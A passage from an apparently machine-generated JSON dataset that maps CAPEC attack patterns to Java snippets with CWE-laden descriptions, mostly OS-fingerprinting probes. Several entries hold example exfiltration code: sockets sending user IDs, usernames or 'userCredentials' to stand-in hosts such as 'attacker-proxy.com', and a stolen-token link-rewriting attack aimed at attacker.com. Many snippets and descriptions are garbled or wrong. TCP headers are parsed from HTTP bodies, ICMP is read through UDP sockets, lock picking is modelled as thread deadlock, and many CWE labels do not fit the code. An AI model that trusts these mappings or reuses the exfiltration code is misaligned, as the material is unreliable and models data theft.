        "code_snippet": "import java.net.Socket;\nimport java.util.concurrent.atomic.AtomicInteger;\n\npublic class OSDetector {\n    private static AtomicInteger seqNum = new AtomicInteger(0);\n    private static long startTime = System.currentTimeMillis();\n    private static long lastSeqNumCheck = startTime;\n    private static int seqNumIncrementRate = 0;\n\n    public static void main(String[] args) throws Exception {\n        Socket socket = new Socket(\"targetHost\", 80);\n        new Thread(new SeqNumIncrementer()).start();\n        new Thread(new SeqNumChecker()).start();\n    }\n\n    private static class SeqNumIncrementer implements Runnable {\n        @Override\n        public void run() {\n            while (true) {\n                seqNum.incrementAndGet();\n                try {\n                    Thread.sleep(10);\n                } catch (InterruptedException e) {\n                    Thread.currentThread().interrupt();\n                }\n            }\n        }\n    }\n\n    private static class SeqNumChecker implements Runnable {\n        @Override\n        public void run() {\n            while (true) {\n                long currentTime = System.currentTimeMillis();\n                int currentSeqNum = seqNum.get();\n                if (currentTime - lastSeqNumCheck > 1000) {\n                    seqNumIncrementRate = currentSeqNum - seqNumIncrementRate;\n                    lastSeqNumCheck = currentTime;\n                    // Compare seqNumIncrementRate with a database of OS and versions\n                    System.out.println(\"Detected OS: \" + getOSFromSeqNumRate(seqNumIncrementRate));\n                }\n            }\n        }\n    }\n\n    private static String getOSFromSeqNumRate(int seqNumIncrementRate) {\n        // Implement the logic to determine the OS based on the sequence number increment rate\n        return \"Unknown\";\n    }\n}\n",
        "description": "This Java code snippet demonstrates an OS detection probe that measures the average rate of initial sequence number increments during a period of time. It uses a time-based algorithm to increment sequence numbers and is susceptible to a timing analysis that can determine the number of increments per unit time. The result of this analysis is then compared against a database of operating systems and versions to determine likely OS matches. The code is vulnerable to CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor), CWE-367 (Time-of-check Time-of-use (TOCTOU) Race Condition), CWE-385 (Covert Timing Channel), CWE-1298 (Hardware Logic Contains Race Conditions), and CWE-362 (Concurrent Execution using Shared Resource with Improper Synchronization ('Race Condition'))."
    },
    {
        "capec_id": "324",
        "code_snippet": "import java.net.Socket;\nimport java.net.InetAddress;\nimport java.io.IOException;\nimport java.util.Random;\n\npublic class SequenceNumberProbe {\n    public static void main(String[] args) {\n        try {\n            Socket socket = new Socket(\"remote_host\", 80);\n            InetAddress address = socket.getInetAddress();\n            long sequenceNumber = socket.getTcpNoDelay() ? (long) (Math.random() * 1000) : System.nanoTime();\n            System.out.println(\"Sequence Number: \" + sequenceNumber);\n            // Send sequence number to a database for comparison\n            // with known operating system behaviors\n        } catch (IOException e) {\n            System.out.println(\"Error: \" + e.getMessage());\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates a sequence number probe that attempts to determine the predictability of a remote host's sequence number generation algorithm. It uses a predictable seed (System.nanoTime()) to generate a sequence number, which is then sent to a database for comparison with known operating system behaviors. This code embodies CWE-337 (Predictable Seed in Pseudo-Random Number Generator), CWE-341 (Predictable from Observable State), and CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor)."
    },
    {
        "capec_id": "325",
        "code_snippet": "import java.net.*;\nimport java.io.*;\n\npublic class ECNProbe {\n    public static void main(String[] args) throws Exception {\n        Socket socket = new Socket(\"remote_host\", 80);\n        OutputStream out = socket.getOutputStream();\n        InputStream in = socket.getInputStream();\n\n        // Send ECN-enabled packet\n        byte[] packet = new byte[] { (byte) 0x01, (byte) 0x02, (byte) 0x03, (byte) 0x04 };\n        out.write(packet);\n\n        // Read response without verifying integrity\n        byte[] response = new byte[1024];\n        in.read(response);\n\n        // Print response in cleartext\n        System.out.println(new String(response));\n\n        // Do not control network message volume\n        for (int i = 0; i < 100; i++) {\n            out.write(packet);\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates an ECN fingerprinting probe that sends an ECN-enabled packet to a remote host and reads the response without verifying its integrity. The response is printed in cleartext, and the code does not control the network message volume, making it vulnerable to network amplification attacks."
    },
    {
        "capec_id": "326",
        "code_snippet": "import java.net.Socket;\nimport java.net.InetAddress;\nimport java.io.IOException;\n\npublic class TCPFingerprinting {\n    public static void main(String[] args) throws IOException {\n        Socket socket = new Socket(\"example.com\", 80);\n        InetAddress address = socket.getInetAddress();\n        byte[] buffer = new byte[1024];\n        int windowSize = socket.getReceiveBufferSize();\n        System.out.println(\"Initial Window Size: \" + windowSize);\n        socket.close();\n    }\n}\n",
        "description": "This Java code snippet demonstrates the CAPEC of OS fingerprinting by checking the initial TCP Window size. The code establishes a TCP connection to a remote server, retrieves the initial window size using the getReceiveBufferSize() method, and prints it to the console. The code is vulnerable to CWE-200: Exposure of Sensitive Information to an Unauthorized Actor, as it exposes the initial window size to an unauthorized actor. Additionally, the code uses a fixed-size buffer (CWE-121: Stack-based Buffer Overflow) and relies on the data/memory layout of the TCP connection (CWE-188: Reliance on Data/Memory Layout). The code also assumes that the getReceiveBufferSize() method will always return a valid window size, which may not be the case (CWE-806: Buffer Access Using Size of Source Buffer). Furthermore, the code does not account for the possibility of test or debug logic being activated at runtime (CWE-1313: Hardware Allows Activation of Test or Debug Logic at Runtime), which could alter the behavior of the system."
    },
    {
        "capec_id": "327",
        "code_snippet": "import java.net.*;\nimport java.io.*;\n\npublic class TCPFingerprinting {\n    public static void main(String[] args) throws IOException {\n        Socket socket = new Socket(\"example.com\", 80);\n        OutputStream os = socket.getOutputStream();\n        os.write(\"GET / HTTP/1.1\\r\\nHost: example.com\\r\\n\\r\\n\".getBytes());\n        os.flush();\n\n        byte[] buffer = new byte[1024];\n        InputStream is = socket.getInputStream();\n        int bytesRead = is.read(buffer);\n        byte[] response = new byte[bytesRead];\n        System.arraycopy(buffer, 0, response, 0, bytesRead);\n\n        // CWE-200: Exposure of Sensitive Information\n        System.out.println(\"Response: \" + new String(response));\n\n        // CWE-188: Reliance on Data/Memory Layout\n        int sourcePort = (response[0] << 8) | response[1];\n        int destPort = (response[2] << 8) | response[3];\n        int seqNum = (response[4] << 24) | (response[5] << 16) | (response[6] << 8) | response[7];\n        int ackNum = (response[8] << 24) | (response[9] << 16) | (response[10] << 8) | response[11];\n        int dataOffset = (response[12] >> 4);\n        int flags = response[12] & 0x0F;\n        int window = (response[14] << 8) | response[15];\n\n        // CWE-1313: Hardware Allows Activation of Test or Debug Logic at Runtime\n        // CWE-605: Multiple Binds to the Same Port\n        // CWE-1316: Fabric-Address Map Allows Programming of Unwarranted Overlaps of Protected and Unprotected Ranges\n        // (Note: These CWEs are not directly applicable in this Java code snippet, but they are related to the CAPEC)\n    }\n}\n",
        "description": "This Java code snippet demonstrates an OS fingerprinting probe that analyzes the type and order of TCP header options present in a response segment. It sends a GET request to a server, reads the response, and extracts the TCP header options. The code then prints the response, which may expose sensitive information (CWE-200). The code also relies on the data/memory layout of the TCP header options, which may lead to unintended program behavior (CWE-188)."
    },
    {
        "capec_id": "328",
        "code_snippet": "import java.net.*;\nimport java.io.*;\nimport java.util.zip.CRC32;\nimport java.nio.ByteBuffer;\n\npublic class OSFingerprintingProbe {\n    public static void main(String[] args) throws IOException {\n        Socket socket = new Socket(\"target_host\", 80);\n        OutputStream outputStream = socket.getOutputStream();\n        InputStream inputStream = socket.getInputStream();\n\n        // CWE-319: Cleartext Transmission of Sensitive Information\n        String payload = \"GET / HTTP/1.1\\r\\nHost: target_host\\r\\n\\r\\n\";\n        outputStream.write(payload.getBytes());\n\n        // CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n        byte[] rstPacket = new byte[1024];\n        int bytesRead = inputStream.read(rstPacket);\n        String rstPacketPayload = new String(rstPacket, 0, bytesRead);\n        System.out.println(\"RST Packet Payload: \" + rstPacketPayload);\n\n        // CWE-353: Missing Support for Integrity Check\n        CRC32 crc32 = new CRC32();\n        crc32.update(rstPacketPayload.getBytes());\n        long checksum = crc32.getValue();\n        System.out.println(\"Checksum: \" + checksum);\n\n        // CWE-354: Improper Validation of Integrity Check Value\n        // No validation of the checksum is performed\n\n        // CWE-294: Authentication Bypass by Capture-replay\n        // The RST packet payload can be captured and replayed to bypass authentication\n    }\n}",
        "description": "This Java code snippet demonstrates an OS fingerprinting probe that sends a GET request to a target host and captures the RST packet response. It then calculates the checksum of the RST packet payload without validating it, exposing sensitive information and allowing for potential authentication bypass."
    },
    {
        "capec_id": "329",
        "code_snippet": "import java.net.InetAddress;\nimport java.net.UnknownHostException;\nimport java.io.IOException;\nimport java.net.DatagramPacket;\nimport java.net.DatagramSocket;\nimport java.net.SocketException;\n\npublic class ICMPErrorGenerator {\n    public static void main(String[] args) {\n        try {\n            InetAddress targetAddress = InetAddress.getByName(\"target-host.com\");\n            DatagramSocket socket = new DatagramSocket();\n            byte[] buffer = new byte[1024];\n            DatagramPacket packet = new DatagramPacket(buffer, buffer.length, targetAddress, 80);\n            socket.send(packet);\n            socket.setSoTimeout(5000);\n            DatagramPacket errorPacket = new DatagramPacket(new byte[1024], 1024);\n            socket.receive(errorPacket);\n            String icmpError = new String(errorPacket.getData()).trim();\n            System.out.println(\"ICMP Error: \" + icmpError);\n            // Analyze the icmpError string to extract sensitive information\n            // For example, extract the originating request data\n            String quotedData = icmpError.substring(icmpError.indexOf(\"quoted\"), icmpError.length());\n            System.out.println(\"Quoted Data: \" + quotedData);\n        } catch (UnknownHostException e) {\n            System.out.println(\"Unknown host\");\n        } catch (SocketException e) {\n            System.out.println(\"Socket exception\");\n        } catch (IOException e) {\n            System.out.println(\"IO exception\");\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates the CAPEC technique of generating an ICMP error message from a target host and analyzing the quoted data from the originating request. The code sends a UDP packet to a target host, receives the ICMP error message, and extracts the quoted data. This code embodies CWE-200 (Exposure of Sensitive Information), CWE-209 (Generation of Error Message Containing Sensitive Information), CWE-210 (Self-generated Error Message Containing Sensitive Information), CWE-211 (Externally-Generated Error Message Containing Sensitive Information), and CWE-444 (Inconsistent Interpretation of HTTP Requests) by exposing sensitive information in the ICMP error message."
    },
    {
        "capec_id": "330",
        "code_snippet": "import java.net.InetAddress;\nimport java.net.UnknownHostException;\nimport java.io.IOException;\nimport java.net.DatagramPacket;\nimport java.net.DatagramSocket;\n\npublic class ICMPErrorGenerator {\n    public static void main(String[] args) {\n        try {\n            InetAddress target = InetAddress.getByName(\"target_ip\");\n            DatagramSocket socket = new DatagramSocket();\n            byte[] buffer = new byte[1024];\n            DatagramPacket packet = new DatagramPacket(buffer, buffer.length, target, 12345);\n            socket.send(packet);\n            socket.close();\n        } catch (UnknownHostException e) {\n            System.out.println(\"Error: \" + e.getMessage());\n        } catch (IOException e) {\n            System.out.println(\"Error: \" + e.getMessage());\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates the CAPEC of generating an ICMP Error message by sending a UDP packet to a target IP address on a closed port, which will trigger an ICMP Destination Unreachable error message. The code is vulnerable to CWE-200, CWE-211, CWE-294, CWE-353, and CWE-210 as it does not handle sensitive information securely, does not verify the integrity of the data during transmission, and may allow an adversary to bypass authentication or capture sensitive information from the error message."
    },
    {
        "capec_id": "331",
        "code_snippet": "import java.net.*;\nimport java.io.*;\n\npublic class UDPResponder {\n    public static void main(String[] args) throws IOException {\n        DatagramSocket socket = new DatagramSocket();\n        byte[] buffer = new byte[1024];\n        DatagramPacket packet = new DatagramPacket(buffer, buffer.length);\n\n        while (true) {\n            socket.receive(packet);\n            String message = new String(packet.getData(), 0, packet.getLength());\n            System.out.println(\"Received message: \" + message);\n\n            // CWE-204: Observable Response Discrepancy\n            // CWE-130: Improper Handling of Length Parameter Inconsistency\n            // CWE-353: Missing Support for Integrity Check\n            // CWE-319: Cleartext Transmission of Sensitive Information\n            // CWE-924: Improper Enforcement of Message Integrity During Transmission in a Communication Channel\n            InetAddress address = packet.getAddress();\n            int port = packet.getPort();\n            String response = \"Port Unreachable\";\n            byte[] responseBytes = response.getBytes();\n            DatagramPacket responsePacket = new DatagramPacket(responseBytes, responseBytes.length, address, port);\n            socket.send(responsePacket);\n        }\n    }\n}",
        "description": "A Java UDP responder that sends a 'Port Unreachable' error message in response to incoming UDP packets, without properly handling length parameters, integrity checks, or encrypting sensitive information, making it vulnerable to various attacks."
    },
    {
        "capec_id": "332",
        "code_snippet": "import java.net.*;\nimport java.io.*;\n\npublic class OSFingerprinting {\n    public static void main(String[] args) throws IOException {\n        DatagramSocket socket = new DatagramSocket();\n        byte[] buffer = new byte[1024];\n        DatagramPacket packet = new DatagramPacket(buffer, buffer.length);\n        socket.send(packet);\n        socket.close();\n\n        // Receive ICMP error message\n        DatagramSocket icmpSocket = new DatagramSocket();\n        icmpSocket.receive(packet);\n        String icmpResponse = new String(packet.getData());\n        System.out.println(\"ICMP Response: \" + icmpResponse);\n\n        // Analyze ICMP response to fingerprint OS\n        if (icmpResponse.contains(\"TTL\")) {\n            System.out.println(\"OS: Windows\");\n        } else if (icmpResponse.contains(\"ip_id\")) {\n            System.out.println(\"OS: Linux\");\n        } else {\n            System.out.println(\"Unknown OS\");\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates the OS fingerprinting attack described in the CAPEC. It sends a UDP datagram to a closed port on a target system and analyzes the ICMP error message response to identify the underlying OS. The code is vulnerable to CWE-204 (Observable Response Discrepancy) as it relies on the differences in ICMP error messages to fingerprint the OS. It also relates to CWE-319 (Cleartext Transmission of Sensitive Information) as the ICMP error message may contain sensitive system information. Additionally, it is vulnerable to CWE-211 (Externally-Generated Error Message Containing Sensitive Information) as the ICMP error message is generated by the OS and may contain sensitive information."
    },
    {
        "capec_id": "383",
        "code_snippet": "public class VirtualSaleEvent {\n    private String userId;\n    private String username;\n    \n    public VirtualSaleEvent(String userId, String username) {\n        this.userId = userId;\n        this.username = username;\n    }\n    \n    public void attendEvent() {\n        // Unprotected primary channel (CWE-419)\n        Socket socket = new Socket(\"attacker-proxy.com\", 8080);\n        \n        // Cleartext transmission of sensitive information (CWE-319)\n        PrintWriter out = new PrintWriter(socket.getOutputStream(), true);\n        out.println(\"userId:\" + userId + \",username:\" + username);\n        \n        // Missing encryption of sensitive data (CWE-311)\n        String unencryptedData = \"userId=\" + userId + \"&username=\" + username;\n        out.println(unencryptedData);\n    }\n    \n    public static void main(String[] args) {\n        // Client-side enforcement of server-side security (CWE-602)\n        VirtualSaleEvent event = new VirtualSaleEvent(\"user123\", \"JohnDoe\");\n        event.attendEvent();\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable VirtualSaleEvent class that allows an adversary to harvest sensitive user data, such as user IDs and usernames, during an event. The code uses an unprotected primary channel, transmits sensitive information in cleartext, and stores sensitive data without encryption, making it vulnerable to attacks."
    },
    {
        "capec_id": "384",
        "code_snippet": "public class VulnerableApplication {\n    public static void processRequest(String request) {\n        // CWE-602: Client-Side Enforcement of Server-Side Security\n        // Trusting client-side validation\n        if (request.startsWith(\"https:\")) {\n            // CWE-311: Missing Encryption of Sensitive Data\n            // Storing sensitive data in plaintext\n            String sensitiveData = request.substring(8);\n            storeData(sensitiveData);\n        } else {\n            // CWE-346: Origin Validation Error\n            // Not verifying the origin of the request\n            processUnverifiedRequest(request);\n        }\n    }\n\n    public static void storeData(String data) {\n        // CWE-471: Modification of Assumed-Immutable Data (MAID)\n        // Modifying assumed-immutable data\n        DataStorage storage = new DataStorage();\n        storage.addData(data);\n    }\n\n    public static void processUnverifiedRequest(String request) {\n        // CWE-345: Insufficient Verification of Data Authenticity\n        // Not verifying the authenticity of the request\n        RequestProcessor processor = new RequestProcessor();\n        processor.process(request);\n    }\n}\n",
        "description": "This Java code snippet demonstrates a vulnerable application that embodies the CAPEC-94 attack. It lacks proper verification of data authenticity, origin validation, and encryption of sensitive data, making it susceptible to manipulation by an attacker."
    },
    {
        "capec_id": "385",
        "code_snippet": "public class ManInTheMiddleAttack {\n    public static void main(String[] args) throws Exception {\n        // CWE-311: Missing Encryption of Sensitive Data\n        String sensitiveData = \"userCredentials\";\n        Socket socket = new Socket(\"attackerServer\", 8080);\n        OutputStream outputStream = socket.getOutputStream();\n        outputStream.write(sensitiveData.getBytes());\n\n        // CWE-602: Client-Side Enforcement of Server-Side Security\n        String itemId = \"itemId\";\n        int itemQuantity = 10;\n        String itemPrice = \"10.99\";\n        String transactionData = itemId + \":\" + itemQuantity + \":\" + itemPrice;\n        outputStream.write(transactionData.getBytes());\n\n        // CWE-346: Origin Validation Error\n        String fakeServerResponse = \"Transaction successful!\";\n        InputStream inputStream = socket.getInputStream();\n        byte[] responseBytes = new byte[1024];\n        inputStream.read(responseBytes);\n        String response = new String(responseBytes);\n        if (!response.equals(fakeServerResponse)) {\n            System.out.println(\"Transaction failed!\");\n        }\n\n        // CWE-345: Insufficient Verification of Data Authenticity\n        String manipulatedData = \"manipulatedItemId\" + \":\" + 20 + \":\" + \"5.99\";\n        outputStream.write(manipulatedData.getBytes());\n\n        // CWE-471: Modification of Assumed-Immutable Data (MAID)\n        String itemIdFromServer = \"itemIdFromServer\";\n        itemIdFromServer = manipulatedData.split(\":\")[0];\n        System.out.println(\"Item ID from server: \" + itemIdFromServer);\n    }\n}\n",
        "description": "This Java code snippet demonstrates a Man-in-the-Middle (MitM) attack, where an attacker intercepts and modifies transaction data between a client and a server. The code violates multiple CWEs, including CWE-311 (Missing Encryption of Sensitive Data), CWE-602 (Client-Side Enforcement of Server-Side Security), CWE-346 (Origin Validation Error), CWE-345 (Insufficient Verification of Data Authenticity), and CWE-471 (Modification of Assumed-Immutable Data). The attacker manipulates the transaction data, including item ID, quantity, and price, and sends it to the server, potentially leading to a fraudulent transaction."
    },
    {
        "capec_id": "386",
        "code_snippet": "public class NavigationRemapper {\n    public static void remapLinks(String userId, String newDestinationUrl) {\n        // CWE-471: Modification of Assumed-Immutable Data (MAID)\n        // Assuming 'links' is a collection of links/buttons displayed to the user\n        for (Link link : links) {\n            if (link.getUserId().equals(userId)) {\n                // CWE-345: Insufficient Verification of Data Authenticity\n                // No verification of the origin or authenticity of 'newDestinationUrl'\n                link.setHref(newDestinationUrl);\n            }\n        }\n    }\n\n    public static void displayLinks() {\n        // CWE-346: Origin Validation Error\n        // No validation of the source of 'links'\n        for (Link link : links) {\n            System.out.println(\"<a href='\" + link.getHref() + \"'>\" + link.getText() + \"</a>\");\n        }\n    }\n\n    public static void storeLinks() {\n        // CWE-602: Client-Side Enforcement of Server-Side Security\n        // Relying on the client to implement a mechanism to protect the server\n        // CWE-311: Missing Encryption of Sensitive Data\n        // No encryption of sensitive information before storage\n        String linksJson = gson.toJson(links);\n        storage.store(linksJson);\n    }\n}",
        "description": "This Java code snippet demonstrates the CAPEC of navigation remapping, where an attacker can manipulate links/buttons displayed to a user within API messages. The code is vulnerable to CWE-471, CWE-345, CWE-346, CWE-602, and CWE-311, making it possible for an attacker to modify the destination and/or content of links/buttons, leading to phishing attacks, click-fraud, or other malicious activities."
    },
    {
        "capec_id": "387",
        "code_snippet": "public class InsecureDataManipulation {\n    public static void processRequest(String request) {\n        // CWE-311: Missing Encryption of Sensitive Data\n        String decryptedRequest = decrypt(request);\n        // CWE-345: Insufficient Verification of Data Authenticity\n        // CWE-346: Origin Validation Error\n        String clientId = getClientIdFromRequest(decryptedRequest);\n        String data = getDataFromRequest(decryptedRequest);\n        // CWE-471: Modification of Assumed-Immutable Data (MAID)\n        // CWE-602: Client-Side Enforcement of Server-Side Security\n        if (clientId.equals(\"trustedClient\")) {\n            // Assume data is immutable and authentic\n            processData(data);\n        }\n    }\n\n    private static String decrypt(String request) {\n        // Insecure decryption logic\n        return request.replace(\"encrypted\", \"decrypted\");\n    }\n\n    private static String getClientIdFromRequest(String request) {\n        // Insecure client ID extraction logic\n        return request.split(\"=\")[1];\n    }\n\n    private static String getDataFromRequest(String request) {\n        // Insecure data extraction logic\n        return request.split(\"=\")[3];\n    }\n\n    private static void processData(String data) {\n        // Process data without verifying its authenticity\n        System.out.println(\"Processing data: \" + data);\n    }\n}",
        "description": "This Java code snippet demonstrates the CAPEC of manipulating egress or ingress data within an application framework to change the content of messages and circumvent the expected application logic. It includes CWEs such as missing encryption of sensitive data, insufficient verification of data authenticity, origin validation error, modification of assumed-immutable data, and client-side enforcement of server-side security."
    },
    {
        "capec_id": "388",
        "code_snippet": "public class VulnerableAPI {\\n\\tprivate String buttonDestination;\\n\\tprivate String buttonText;\\n\\t\\n\\tpublic VulnerableAPI(String buttonDestination, String buttonText) {\\n\\t\\tthis.buttonDestination = buttonDestination;\\n\\t\\tthis.buttonText = buttonText;\\n\\t}\\n\\t\\n\\tpublic String getAPIResponse() {\\n\\t\\tString apiResponse = \"<button onclick=\\\"location.href='\" + buttonDestination + \"'\\\">\" + buttonText + \"</button>\";\\n\\t\\treturn apiResponse;\\n\\t}\\n\\t\\n\\tpublic static void main(String[] args) {\\n\\t\\tVulnerableAPI api = new VulnerableAPI(\"https://attacker-controlled-destination.com\", \"Click me!\");\\n\\t\\tString apiResponse = api.getAPIResponse();\\n\\t\\tSystem.out.println(apiResponse);\\n\\t}\\n}\\n",
        "description": "This Java code snippet demonstrates a vulnerable API that generates a button with a destination URL and text. The API does not properly validate or encrypt the input data, allowing an attacker to manipulate the button's destination and content. The main method creates an instance of the VulnerableAPI class with an attacker-controlled destination URL and button text, and then prints the generated API response to the console."
    },
    {
        "capec_id": "389",
        "code_snippet": "import java.net.URL;\nimport java.net.HttpURLConnection;\nimport java.io.BufferedReader;\nimport java.io.InputStreamReader;\n\npublic class SpoofingAttack {\n    public static void main(String[] args) throws Exception {\n        URL url = new URL(\"https://example.com/api/data\");\n        HttpURLConnection conn = (HttpURLConnection) url.openConnection();\n        conn.setRequestMethod(\"GET\");\n        conn.setRequestProperty(\"Authorization\", \"Bearer \" + getStolenToken());\n\n        int status = conn.getResponseCode();\n        if (status == 200) {\n            BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()));\n            String inputLine;\n            StringBuffer content = new StringBuffer();\n            while ((inputLine = in.readLine()) != null) {\n                content.append(inputLine);\n            }\n            in.close();\n\n            // Modify the received data to inject malicious content\n            String modifiedContent = content.toString().replace(\"<a href=\\\"https://example.com\\\">\", \"<a href=\\\"https://attacker.com\\\">\");\n            System.out.println(modifiedContent);\n        } else {\n            System.out.println(\"Failed to retrieve data\");\n        }\n    }\n\n    private static String getStolenToken() {\n        // Implement a mechanism to steal a valid authentication token\n        // This could be done by sniffing network traffic or using a malicious client\n        return \"stolen_token\";\n    }\n}",
        "description": "This Java code snippet demonstrates a content-spoofing attack within an application API. It uses a stolen authentication token to send a GET request to a server, retrieves the response, and then modifies the received data to inject malicious content. The code does not implement any integrity checks on the received data, making it vulnerable to tampering. The getStolenToken() method is a placeholder for a mechanism to steal a valid authentication token, which could be done by sniffing network traffic or using a malicious client. This code embodies the CAPEC and CWEs by demonstrating a lack of support for integrity checks, client-side enforcement of server-side security, and authentication bypass by capture-replay and spoofing."
    },
    {
        "capec_id": "390",
        "code_snippet": "public class PhysicalSecurityBreach {\n    private static final String SECRET_KEY = \"my_secret_key\";\n    private static final int MAX_VOLTAGE = 5;\n    private static final int MIN_VOLTAGE = 3;\n\n    public static void main(String[] args) {\n        // CWE-1300: Improper Protection of Physical Side Channels\n        // Using a simple power consumption pattern to expose sensitive information\n        for (int i = 0; i < 10; i++) {\n            if (i % 2 == 0) {\n                // High power consumption\n                System.out.println(\"High power consumption\");\n            } else {\n                // Low power consumption\n                System.out.println(\"Low power consumption\");\n            }\n        }\n\n        // CWE-1263: Improper Physical Access Control\n        // Restricting access to sensitive information, but not protecting against physical access\n        if (hasPhysicalAccess()) {\n            System.out.println(\"Access granted: \" + SECRET_KEY);\n        } else {\n            System.out.println(\"Access denied\");\n        }\n\n        // CWE-1247: Improper Protection Against Voltage and Clock Glitches\n        // Not detecting voltage glitches\n        int voltage = getVoltage();\n        if (voltage > MAX_VOLTAGE || voltage < MIN_VOLTAGE) {\n            System.out.println(\"Voltage glitch detected\");\n        }\n\n        // CWE-1319: Improper Protection against Electromagnetic Fault Injection (EM-FI)\n        // Susceptible to electromagnetic fault injection attacks\n        boolean isSecure = isDeviceSecure();\n        if (!isSecure) {\n            System.out.println(\"Device is not secure\");\n        }\n\n        // CWE-1320: Improper Protection for Outbound Error Messages and Alert Signals\n        // Not handling alerts about signal conditions exceeding limits\n        if (isSignalConditionExceeded()) {\n            System.out.println(\"Signal condition exceeded\");\n        }\n    }\n\n    private static boolean hasPhysicalAccess() {\n        // Simulating physical access control\n        return true;\n    }\n\n    private static int getVoltage() {\n        // Simulating voltage measurement\n        return 4;\n    }\n\n    private static boolean isDeviceSecure() {\n        // Simulating device security check\n        return false;\n    }\n\n    private static boolean isSignalConditionExceeded() {\n        // Simulating signal condition check\n        return true;\n    }\n}",
        "description": "This Java code snippet demonstrates a physical security breach by exploiting various weaknesses, including improper protection of physical side channels, physical access control, voltage and clock glitches, electromagnetic fault injection, and outbound error messages and alert signals. The code uses simple patterns and simulations to illustrate these vulnerabilities."
    },
    {
        "capec_id": "391",
        "code_snippet": "public class PhysicalAccessController {\n    private boolean isLocked = true;\n    private boolean isAdminMode = false;\n    private boolean isDebugMode = false;\n\n    public void lockDevice() {\n        if (!isAdminMode && !isDebugMode) {\n            isLocked = true;\n        }\n    }\n\n    public void unlockDevice() {\n        if (isAdminMode || isDebugMode) {\n            isLocked = false;\n        }\n    }\n\n    public void setAdminMode(boolean isAdmin) {\n        isAdminMode = isAdmin;\n    }\n\n    public void setDebugMode(boolean isDebug) {\n        isDebugMode = isDebug;\n    }\n\n    public boolean isDeviceLocked() {\n        return isLocked;\n    }\n}\n",
        "description": "This Java code snippet demonstrates a physical access controller that can be bypassed due to improper physical access control (CWE-1263). The lock can be externally controlled or influenced by an actor outside of the intended sphere of control (CWE-412). Additionally, the lock can be overridden during debug mode (CWE-1234). The code allows an attacker to bypass the physical lock by setting admin mode or debug mode, highlighting the insufficient granularity of address regions protected by register locks (CWE-1222) and the improper prevention of lock bit modification (CWE-1231)."
    },
    {
        "capec_id": "392",
        "code_snippet": "public class LockBumpingAttack {\n    private static final int LOCK_BIT = 0x01;\n    private static final int KEY_PIN_COUNT = 5;\n    private static final int[] KEY_PINS = new int[KEY_PIN_COUNT];\n    private static final int[] DRIVER_PINS = new int[KEY_PIN_COUNT];\n\n    public static void main(String[] args) {\n        // CWE-1231: Improper Prevention of Lock Bit Modification\n        setLockBit(LOCK_BIT);\n\n        // CWE-1222: Insufficient Granularity of Address Regions Protected by Register Locks\n        int addressRegion = 0x1000;\n        lockAddressRegion(addressRegion);\n\n        // CWE-1232: Improper Lock Behavior After Power State Transition\n        powerStateTransition();\n        setLockBit(LOCK_BIT);\n\n        // CWE-321: Use of Hard-coded Cryptographic Key\n        String hardCodedKey = \"my_secret_key\";\n        encryptData(hardCodedKey);\n\n        // CWE-645: Overly Restrictive Account Lockout Mechanism\n        int maxAttempts = 3;\n        int attempts = 0;\n        while (attempts < maxAttempts) {\n            if (!authenticateUser()) {\n                attempts++;\n                if (attempts == maxAttempts) {\n                    lockoutAccount();\n                }\n            }\n        }\n    }\n\n    private static void setLockBit(int lockBit) {\n        // Simulate setting the lock bit\n        System.out.println(\"Lock bit set: \" + lockBit);\n    }\n\n    private static void lockAddressRegion(int addressRegion) {\n        // Simulate locking the address region\n        System.out.println(\"Address region locked: \" + addressRegion);\n    }\n\n    private static void powerStateTransition() {\n        // Simulate power state transition\n        System.out.println(\"Power state transitioned\");\n    }\n\n    private static void encryptData(String key) {\n        // Simulate encrypting data with hard-coded key\n        System.out.println(\"Data encrypted with key: \" + key);\n    }\n\n    private static boolean authenticateUser() {\n        // Simulate user authentication\n        return false;\n    }\n\n    private static void lockoutAccount() {\n        // Simulate account lockout\n        System.out.println(\"Account locked out\");\n    }\n}",
        "description": "This Java code snippet demonstrates the concept of lock bumping, where an attacker uses a special key to force a lock open. The code includes vulnerabilities related to CWE-1231 (Improper Prevention of Lock Bit Modification), CWE-1222 (Insufficient Granularity of Address Regions Protected by Register Locks), CWE-1232 (Improper Lock Behavior After Power State Transition), CWE-321 (Use of Hard-coded Cryptographic Key), and CWE-645 (Overly Restrictive Account Lockout Mechanism)."
    },
    {
        "capec_id": "393",
        "code_snippet": "public class LockPickingAttack {\n    private static final Object lock = new Object();\n    private static boolean isLocked = true;\n\n    public static void main(String[] args) {\n        new Thread(new Runnable() {\n            public void run() {\n                while (isLocked) {\n                    try {\n                        Thread.sleep(100);\n                    } catch (InterruptedException e) {\n                        e.printStackTrace();\n                    }\n                }\n                System.out.println(\"Thread 1: Lock is unlocked, I can access the resource\");\n            }\n        }).start();\n\n        new Thread(new Runnable() {\n            public void run() {\n                synchronized (lock) {\n                    try {\n                        Thread.sleep(500);\n                    } catch (InterruptedException e) {\n                        e.printStackTrace();\n                    }\n                    isLocked = false;\n                    System.out.println(\"Thread 2: Unlocking the resource\");\n                }\n            }\n        }).start();\n\n        synchronized (lock) {\n            while (isLocked) {\n                try {\n                    lock.wait();\n                } catch (InterruptedException e) {\n                    e.printStackTrace();\n                }\n            }\n            System.out.println(\"Main Thread: Lock is unlocked, I can access the resource\");\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates a lock picking attack, where multiple threads are waiting for each other to release a necessary lock, resulting in deadlock (CWE-833). The code also exhibits insufficient granularity of address regions protected by register locks (CWE-1222), as the lock is not properly restricted to a specific region. Furthermore, the code does not prevent the value of the lock bit from being modified after it has been set (CWE-1231), allowing an attacker to manipulate the lock. Additionally, the lock can be externally controlled or influenced by an actor that is outside of the intended sphere of control (CWE-412). The code also attempts to unlock a resource that is not locked (CWE-832)."
    },
    {
        "capec_id": "394",
